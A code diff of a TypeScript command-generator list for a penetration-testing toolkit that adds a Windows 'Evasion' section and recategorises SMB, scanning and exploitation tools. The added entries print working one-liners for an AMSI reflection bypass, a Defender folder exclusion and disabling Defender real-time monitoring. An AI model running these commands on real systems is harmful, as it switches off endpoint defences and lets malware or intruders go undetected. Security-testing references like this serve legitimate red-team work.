@@ -1,3 +1,4 @@
+
 import { Tool, ToolArg } from '../types';
 
 // --- Helpers ---
@@ -31,11 +32,48 @@ const ARG_WL_VHOST = createArg.input('wordlistVhost', 'VHost Wordlist', '/usr/sh
 // --- Tools Data ---
 
 export const TOOLS: Tool[] = [
+    // --- WINDOWS -> EVASION ---
+    {
+        id: 'amsi_bypass',
+        name: 'AMSI Bypass (Reflection)',
+        category: 'WINDOWS',
+        subcategory: 'Evasion',
+        desc: 'Matt Graeber\'s classic reflection bypass to disable AMSI in the current PowerShell session.',
+        authMode: 'none',
+        generate: (v, args) => {
+            return `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
+        }
+    },
+    {
+        id: 'defender_exclusion',
+        name: 'Defender Exclusion (Path)',
+        category: 'WINDOWS',
+        subcategory: 'Evasion',
+        desc: 'Add a folder exclusion to Windows Defender to prevent scanning of tools (Requires Admin).',
+        authMode: 'none',
+        args: [createArg.input('exclusionPath', 'Path', 'C:\\Temp', 'C:\\Path\\To\\Exclude')],
+        generate: (v, args) => {
+            return `Add-MpPreference -ExclusionPath "${args.exclusionPath || 'C:\\Temp'}"`;
+        }
+    },
+    {
+        id: 'disable_realtime_monitoring',
+        name: 'Disable Real-time Monitor',
+        category: 'WINDOWS',
+        subcategory: 'Evasion',
+        desc: 'Disable Windows Defender Real-time Monitoring completely (Requires Admin).',
+        authMode: 'none',
+        generate: (v, args) => {
+            return `Set-MpPreference -DisableRealtimeMonitoring $true`;
+        }
+    },
+
+    // --- SERVICE (Service Enumeration) -> SMB ---
     {
         id: 'smbclient',
         name: 'smbclient',
-        category: 'SMB',
-        subcategory: 'Enumeration',
+        category: 'SERVICE',
+        subcategory: 'SMB',
         desc: 'FTP-like client to access SMB/CIFS resources.',
         authMode: 'optional',
         args: [ARG_CREDS],
@@ -47,8 +85,8 @@ export const TOOLS: Tool[] = [
     {
         id: 'smbmap',
         name: 'smbmap',
-        category: 'SMB',
-        subcategory: 'Enumeration',
+        category: 'SERVICE',
+        subcategory: 'SMB',
         desc: 'SMB enumeration tool.',
         authMode: 'optional',
         args: [ARG_CREDS],
@@ -62,8 +100,8 @@ export const TOOLS: Tool[] = [
     {
         id: 'enum4linux',
         name: 'enum4linux-ng',
-        category: 'SMB',
-        subcategory: 'Enumeration',
+        category: 'SERVICE',
+        subcategory: 'SMB',
         desc: 'Next-gen version of enum4linux.',
         authMode: 'optional',
         args: [ARG_CREDS],
@@ -77,8 +115,8 @@ export const TOOLS: Tool[] = [
     {
         id: 'nxc',
         name: 'NetExec (nxc)',
-        category: 'SMB',
-        subcategory: 'Enumeration',
+        category: 'SERVICE',
+        subcategory: 'SMB',
         desc: 'Network Execution tool (formerly crackmapexec).',
         authMode: 'optional',
         args: [ARG_CREDS],
@@ -105,7 +143,7 @@ export const TOOLS: Tool[] = [
     {
         id: 'lftp',
         name: 'LFTP',
-        category: 'REMOTE',
+        category: 'OTHER',
         subcategory: 'FTP',
         desc: 'Sophisticated file transfer program.',
         authMode: 'required',
@@ -116,7 +154,7 @@ export const TOOLS: Tool[] = [
     {
         id: 'sshpass',
         name: 'SSHPass',
-        category: 'REMOTE',
+        category: 'OTHER',
         subcategory: 'SSH',
         desc: 'Non-interactive ssh password provider.',
         authMode: 'required',
@@ -127,7 +165,7 @@ export const TOOLS: Tool[] = [
     {
         id: 'xfreerdp',
         name: 'xFreeRDP',
-        category: 'REMOTE',
+        category: 'OTHER',
         subcategory: 'RDP',
         desc: 'RDP Client.',
         authMode: 'required',
@@ -140,26 +178,24 @@ export const TOOLS: Tool[] = [
     {
         id: 'nmap',
         name: 'Nmap',
-        category: 'SCAN',
+        category: 'SERVICE',
         subcategory: 'Port Scanning',
         desc: 'Network exploration and security auditing.',
         authMode: 'none',
         args: [
             createArg.toggle('udp', 'UDP Scan (-sU)', false),
-            createArg.toggle('serviceVersion', 'Service Version (-sV)', true),
-            createArg.toggle('scripts', 'Default Scripts (-sC)', true)
         ],
         generate: (v, args) => {
             const proto = args.udp ? '-sU' : '';
             const sv = args.serviceVersion ? '-sV' : '';
             const sc = args.scripts ? '-sC' : '';
-            return `nmap ${proto} ${sv} ${sc} -Pn -v ${v.target || '$TARGET'}`;
+            return `nmap ${proto} -sV -sC -Pn -v ${v.target || '$TARGET'}`;
         }
     },
     {
         id: 'rustscan',
         name: 'RustScan',
-        category: 'SCAN',
+        category: 'SERVICE',
         subcategory: 'Port Scanning',
         desc: 'Faster Nmap scanner.',
         authMode: 'none',
@@ -171,7 +207,7 @@ export const TOOLS: Tool[] = [
     {
         id: 'msfconsole',
         name: 'Metasploit Handler',
-        category: 'VULN',
+        category: 'EXPLOIT',
         subcategory: 'Listeners',
         desc: 'Quick listener setup.',
         authMode: 'none',
@@ -331,7 +367,7 @@ export const TOOLS: Tool[] = [
     {
         id: 'nuclei',
         name: 'Nuclei',
-        category: 'VULN',
+        category: 'EXPLOIT',
         subcategory: 'Scanning',
         desc: 'Vulnerability scanner.',
         authMode: 'none',
@@ -347,7 +383,7 @@ export const TOOLS: Tool[] = [
     {
         id: 'zaproxy',
         name: 'Zaproxy',
-        category: 'VULN',
+        category: 'EXPLOIT',
         subcategory: 'Scanning',
         desc: 'OWASP ZAP automated scan.',
         authMode: 'none',
